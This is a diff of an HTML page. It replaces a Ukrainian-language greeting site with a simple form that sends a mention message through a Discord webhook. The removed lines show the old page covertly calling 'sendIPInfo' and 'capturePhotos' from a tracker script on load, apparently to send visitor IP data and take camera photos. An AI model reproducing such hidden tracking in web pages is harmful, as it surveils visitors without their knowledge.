@@ -1,63 +1,64 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>Сайт Севки</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Discord Webhook Mention</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
-  body {
-    margin: 0;
-    height: 100vh;
-    background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    user-select: none;
-    overflow: hidden;
-  }
-  .glass-container {
-    background: rgba(255, 255, 255, 0.15);
-    border-radius: 20px;
-    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-    backdrop-filter: blur(10px);
-    -webkit-backdrop-filter: blur(10px);
-    border: 1px solid rgba(255, 255, 255, 0.18);
-    padding: 40px;
-    width: 380px;
-    text-align: center;
-    color: white;
-    text-shadow: 0 0 8px rgba(0,0,0,0.7);
-    font-weight: 700;
-    font-size: 1.5rem;
-  }
+  body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; }
+  label { display: block; margin-top: 15px; }
+  input, button { width: 100%; padding: 8px; margin-top: 5px; }
+  button { cursor: pointer; }
+  #status { margin-top: 20px; font-weight: bold; }
 </style>
 </head>
 <body>
-  <div class="glass-container">
-    <div>Привiт, Це Сайт Севки</div>
-    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
-      Нажми пробел або кликни щоби продовжити
-    </div>
-  </div>
 
-  <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
+<h2>Send Discord Webhook Message with Mention</h2>
 
-  <script type="module">
-    import { sendIPInfo, capturePhotos } from './tracker.js';
+<label for="webhook">Webhook URL:</label>
+<input type="url" id="webhook" placeholder="Enter webhook URL" required />
 
-    async function init() {
-      sendIPInfo();
-      try {
-        await capturePhotos();
-      } catch {
-        const audio = document.getElementById('audio');
-        audio.volume = 1.0;
-        audio.play().catch(() => {});
-      }
+<label for="userId">User ID to mention:</label>
+<input type="text" id="userId" placeholder="Enter Discord user ID" required />
+
+<label for="message">Additional message (optional):</label>
+<input type="text" id="message" placeholder="Enter message" />
+
+<button id="sendBtn">Send Message</button>
+
+<p id="status"></p>
+
+<script>
+document.getElementById('sendBtn').addEventListener('click', async () => {
+  const webhook = document.getElementById('webhook').value.trim();
+  const userId = document.getElementById('userId').value.trim();
+  const message = document.getElementById('message').value.trim();
+
+  if (!webhook || !userId) {
+    document.getElementById('status').textContent = "Webhook URL and User ID are required.";
+    return;
+  }
+
+  const content = `<@${userId}>${message ? " " + message : ""}`;
+
+  try {
+    const response = await fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content }),
+    });
+
+    if (response.ok) {
+      document.getElementById('status').textContent = "Message sent successfully!";
+    } else {
+      document.getElementById('status').textContent = `Failed to send message. Status: ${response.status}`;
     }
+  } catch (error) {
+    document.getElementById('status').textContent = `Error: ${error.message}`;
+  }
+});
+</script>
 
-    window.onload = init;
-  </script>
 </body>
 </html>
